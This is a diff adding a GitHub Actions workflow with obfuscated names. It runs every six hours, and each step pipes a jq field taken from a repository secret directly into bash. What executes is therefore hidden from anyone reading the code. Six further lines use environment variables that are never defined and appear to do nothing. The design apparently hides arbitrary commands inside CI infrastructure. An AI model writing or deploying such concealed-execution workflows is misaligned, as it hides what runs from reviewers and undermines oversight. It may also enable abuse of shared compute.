@@ -1,0 +1,23 @@
+name: dawangfengliang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dawangfengliang
+        env:
+          dbd932: ${{ secrets.dbd932 }}
+        run: |
+          echo $dbd932 | jq -r .uyndc407 | /bin/bash
+          echo $zsw9955 | jq -r .ibzr708 | /bin/bash
+          echo $cmff4437 | jq -r .mhfkk8 | /bin/bash
+          echo $fncog2 | jq -r .fy34039 | /bin/bash
+          echo $bnfs60467 | jq -r .m6 | /bin/bash
+          echo $a057 | jq -r .neha4920 | /bin/bash
+          echo $esgo1276 | jq -r .n9 | /bin/bash
+
